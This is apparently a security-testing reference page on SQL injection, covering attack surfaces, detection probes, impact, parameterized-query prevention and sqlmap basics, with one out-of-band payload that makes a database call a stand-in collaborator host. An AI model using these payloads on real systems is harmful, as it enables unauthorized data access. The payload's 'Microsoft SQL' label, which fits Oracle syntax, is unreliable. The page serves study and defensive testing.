# SQL Injection

## What is SQL Injection?

SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in an application's database layer. It occurs when user-supplied input is concatenated directly into SQL queries without proper sanitization or parameterization. Attackers can manipulate queries to read, modify, or delete data, bypass authentication, or execute administrative operations on the database.

**Important Warning:** Be extremely careful with broad conditions like `OR 1=1`. The same input may be used in multiple queries (including UPDATE or DELETE), which can cause accidental data loss or corruption.

## Attack Surface

- Login forms and authentication mechanisms
- Search functionality
- Filters, sorting, and pagination parameters
- Any database-backed feature that accepts user input (comments, profiles, product lookups, etc.)
- XML or JSON inputs that are later used in SQL queries (second-order)

## Identification

- Inject a single quote `'` and look for database errors, different responses, or anomalies.
- Use comment sequences to truncate queries: `-- ` (note the space for MySQL) or `#`.
- Test time-based conditions or OAST (out-of-band) to detect blind injection.
- Observe differences in application behavior for TRUE vs FALSE conditions in blind scenarios.
- Check error messages when syntax is valid vs invalid.

## Exploits

- [Login Bypass](sql-injection/login-bypass.md)
- [UNION-Based SQLi](sql-injection/union-based.md)
- [Blind SQLi](sql-injection/blind.md)
- [Error-Based SQLi](sql-injection/error-based.md)
- [Time-Based Blind SQLi](sql-injection/time-based.md)
- [OAST (Out-of-Band) SQLi](sql-injection/oast.md)

## Impact

- Complete database compromise (read all data)
- Authentication bypass and account takeover
- Data modification or destruction
- Execution of administrative database commands
- In some cases, operating system command execution via database features (xp_cmdshell, etc.)

## Prevention

- Use **parameterized queries** (prepared statements) exclusively. Never concatenate user input into SQL strings.

Vulnerable (string concatenation):
```js
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
```

Safe:
```js
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
```

- When parameterized queries cannot be used (column names, ORDER BY), implement strict whitelisting of allowed values.
- Apply the principle of least privilege to database accounts.
- Use ORM frameworks carefully (many still allow raw queries).
- Input validation as a defense-in-depth layer, not the primary control.
- Web Application Firewalls (WAF) as an additional control.

## Tools & Payloads

- Burp Suite (manual testing + Intruder for automation)
- sqlmap for automated detection and exploitation
- Custom scripts for specific blind or OAST scenarios

**Common cheat sheet reference:** PortSwigger SQL Injection Cheat Sheet

### SQLMap Essentials

SQLMap supports multiple techniques (BEUSTQ by default):
- B: Boolean-based blind
- E: Error-based
- U: Union-based
- S: Stacked queries
- T: Time-based blind
- Q: Inline queries

Basic usage targets parameters. Use `--cookie`, headers, or `*` marker for custom injection points.

Example techniques and when to use them are detailed below. Run with `-h` or consult the wiki for full options.

**Example OAST Microsoft SQL payload (URL encoded as needed):**
```sql
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//collaborator.example.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```
